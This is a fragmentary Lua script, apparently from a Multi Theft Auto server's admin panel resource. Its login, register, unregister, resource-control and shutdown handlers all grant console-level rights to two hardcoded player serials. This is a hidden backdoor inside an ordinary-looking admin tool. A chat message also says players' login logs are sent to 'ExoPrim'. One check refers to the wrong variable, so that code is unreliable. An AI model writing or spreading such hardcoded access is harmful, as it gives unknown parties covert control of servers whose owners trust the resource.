...
function notifyPlayerLoggedIn(player)
	outputChatBox ( "Baraye Baz Kardan Panel Admini 'p' Bezan [Your Login Log Send To ExoPrim]", player )
	local unread = 0
...
addEventHandler ( "onPlayerLogin", _root, function ( previous, account, auto )
	if getElementType(source) == "console" or getPlayerSerial(source) == "11056965D2EF78959718CB70EC8F8493" or getPlayerSerial(source) == "A4C8B2168C7022C254903FD1618CB4A2" then
...
addCommandHandler ( "register", function ( player, command, arg1, arg2 )
	if getElementType(player) == "console" or getPlayerSerial(player) == "11056965D2EF78959718CB70EC8F8493" or getPlayerSerial(player) == "A4C8B2168C7022C254903FD1618CB4A2" then
...
addEventHandler("onPlayerCommand",root,
    function(command)
	if command == "login" or command == "loginout" or command == "stop" or command == "start" or command == "refresh" or command == "refreshall" or command == "shutdown"  then
		if getElementType(source) == "console" or getPlayerSerial(source) == "11056965D2EF78959718CB70EC8F8493" or getPlayerSerial(source) == "A4C8B2168C7022C254903FD1618CB4A2" then
...
addCommandHandler ( "unregister", function ( player, command, arg1, arg2 )
	if getElementType(player) == "console" or getPlayerSerial(source) == "11056965D2EF78959718CB70EC8F8493" or getPlayerSerial(source) == "A4C8B2168C7022C254903FD1618CB4A2" then
